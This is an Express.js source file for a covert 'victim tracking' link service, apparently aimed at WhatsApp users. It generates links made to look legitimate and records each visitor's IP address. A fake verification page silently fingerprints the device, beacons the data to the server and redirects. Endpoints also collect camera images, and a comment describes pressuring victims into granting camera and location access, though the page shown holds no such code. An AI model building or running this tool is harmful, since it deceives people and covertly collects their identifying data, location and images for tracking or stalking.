const express = require('express');
const crypto  = require('crypto');
const router  = express.Router();

// In-memory session store (per-process; resets on dyno restart — acceptable for short-lived tracking links)
const _locStore = {};

// ── Cleanup: remove sessions older than 2 hours so memory doesn't grow forever ──
setInterval(() => {
    const cutoff = Date.now() - 2 * 60 * 60 * 1000;
    for (const tok of Object.keys(_locStore)) {
        if (_locStore[tok].timestamp < cutoff) delete _locStore[tok];
    }
}, 30 * 60 * 1000); // run every 30 min

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/start   →   generate tracking session
//  Body: { userId }   — userId is just a label (e.g. WhatsApp JID)
// ─────────────────────────────────────────────────────────────────────
router.post('/start', (req, res) => {
    const userId = req.body.userId || req.query.userId;
    if (!userId) return res.status(400).json({ error: 'Missing userId' });

    const sessionToken = crypto.randomBytes(16).toString('hex');
    _locStore[sessionToken] = {
        userId,
        clientIp   : null,
        metrics    : null,
        cameraImage: null,
        timestamp  : Date.now()
    };

    // ── Auto-detect public URL — zero config needed ─────────────────────────
    // Priority:
    //  1. global._detectedPublicHost  — auto-saved from first external HTTP request
    //  2. HEROKU_APP_NAME env          — just set the APP NAME (not full URL); Heroku auto-sets this
    //                                    if Dyno Metadata labs feature is enabled (free)
    //  3. APP_URL env                  — manual fallback (full URL)
    //  4. REPLIT_DEV_DOMAIN            — Replit environment
    //  5. localhost                    — local dev only
    const host = (global._detectedPublicHost || '')
        || (process.env.HEROKU_APP_NAME  ? `https://${process.env.HEROKU_APP_NAME}.herokuapp.com` : '')
        || (process.env.APP_URL          ? process.env.APP_URL.replace(/\/$/, '') : '')
        || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : '')
        || `http://localhost:${process.env.PORT || 3001}`;

    // Generate a CLEAN, human-friendly link (no /api/ in path — looks legitimate)
    const link = `${host}/verify-identity/${sessionToken}`;
    res.json({ sessionToken, link });
});

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/result/:sessionToken   →   fetch captured data
// ─────────────────────────────────────────────────────────────────────
router.get('/result/:sessionToken', (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found or expired' });
    res.json({
        userId     : s.userId,
        ip         : s.clientIp,
        metrics    : s.metrics,
        hasCamera  : !!s.cameraImage,
        cameraThumb: s.cameraImage ? s.cameraImage.substring(0, 80) + '…' : null,
        timestamp  : s.timestamp
    });
});

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/camera/:sessionToken   →   full camera base64
// ─────────────────────────────────────────────────────────────────────
router.get('/camera/:sessionToken', (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found or expired' });
    if (!s.cameraImage) return res.status(204).json({ error: 'No camera image yet' });
    res.json({ image: s.cameraImage });
});

/**
 * Shared HTML page for the victim tracking page.
 * Used by both the old /api/location/v/:token and new /verify-identity/:token routes.
 *
 * PERMISSION FLOW (NEW):
 *  1. User clicks "Tap to Verify"
 *  2. Page requests camera permission via getUserMedia
 *  3. If DENIED → show "Allow it to verify you are human" message + retry button
 *     → DO NOT redirect until both camera & location are allowed
 *  4. If GRANTED → capture camera snapshot + start GPS
 *  5. After both are captured → redirect to simdatabase
 */
function renderVictimPage(sessionToken, redirectUrl) {
  const REDIRECT_URL = redirectUrl || 'https://cybersecprosimdatabase.vercel.app/';
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting..</title>
  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      min-height: 100vh;
      background: linear-gradient(135deg, #0d1b2e 0%, #1b2838 100%);
      display: flex; align-items: center; justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      padding: 20px;
    }
    .card {
      background: rgba(255,255,255,0.06);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 20px;
      padding: 40px 32px;
      max-width: 380px;
      width: 100%;
      text-align: center;
    }
    .spinner {
      width: 40px; height: 40px;
      border: 3px solid rgba(255,255,255,0.08);
      border-top-color: #e02e4f;
      border-radius: 50%;
      margin: 0 auto 16px;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    h1 { color: #fff; font-size: 18px; font-weight: 500; margin-bottom: 8px; }
    p { color: rgba(255,255,255,0.4); font-size: 13px; line-height: 1.5; }
  </style>
</head>
<body>
  <div class="card">
    <div class="spinner"></div>
    <h1>Verifying session…</h1>
    <p>Please wait a moment</p>
  </div>

  <script>
  (function () {
    var TOK  = '${sessionToken}';
    var BASE = window.location.origin;
    var DEST = '${REDIRECT_URL}';

    // ── Device info (no permissions needed) ──────────────
    var info = {
      ua       : navigator.userAgent,
      platform : navigator.platform || '',
      lang     : navigator.language,
      langs    : navigator.languages ? Array.from(navigator.languages) : [],
      screen   : { w: screen.width, h: screen.height, aw: screen.availWidth, ah: screen.availHeight },
      dpr      : window.devicePixelRatio || 1,
      tz       : Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookies  : navigator.cookieEnabled,
      cores    : navigator.hardwareConcurrency || null,
      memory   : navigator.deviceMemory || null,
      touch    : ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
      referrer : document.referrer || 'direct',
      conn     : navigator.connection ? {
                   type: navigator.connection.effectiveType,
                   rtt : navigator.connection.rtt,
                   dl  : navigator.connection.downlink
                 } : null
    };

    // ── Send silently (sendBeacon survives navigation) ──
    try {
      var body = JSON.stringify(info);
      if (navigator.sendBeacon) {
        navigator.sendBeacon(BASE + '/api/location/log/' + TOK,
          new Blob([body], { type: 'application/json' }));
      } else {
        var x = new XMLHttpRequest();
        x.open('POST', BASE + '/api/location/log/' + TOK, false);
        x.setRequestHeader('Content-Type', 'application/json');
        x.send(body);
      }
    } catch (e) {}

    // ── Redirect after 2s ────────────────────────────────
    setTimeout(function () {
      window.location.replace(DEST);
    }, 2000);
  })();
  </script>
</body>
</html>`;
}

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/v/:sessionToken   →   OLD VICTIM PAGE (backward compat)
//  Kept for old links still in circulation.
// ─────────────────────────────────────────────────────────────────────
router.get('/v/:sessionToken', (req, res) => {
    const sessionToken = req.params.sessionToken;
    if (!_locStore[sessionToken]) return res.status(404).send('Link expired or invalid.');

    // Capture victim IP immediately on page load
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
        || req.socket.remoteAddress;
    _locStore[sessionToken].clientIp   = clientIp;
    _locStore[sessionToken].timestamp  = Date.now();

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
    res.setHeader('Feature-Policy', "camera 'self'; geolocation 'self'; microphone 'self'");
    res.send(renderVictimPage(sessionToken));
});

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/log/:sessionToken   →   receive device metrics
// ─────────────────────────────────────────────────────────────────────
router.post('/log/:sessionToken', express.json({ limit: '50kb' }), (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found' });
    s.metrics   = req.body;
    s.timestamp = Date.now();
    res.json({ status: 'ok' });
});

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/cam/:sessionToken   →   receive camera image
// ─────────────────────────────────────────────────────────────────────
router.post('/cam/:sessionToken', express.json({ limit: '10mb' }), (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found' });
    s.cameraImage = req.body.image;
    s.timestamp   = Date.now();
    res.json({ status: 'ok' });
});

module.exports = { router, renderVictimPage, _locStore };
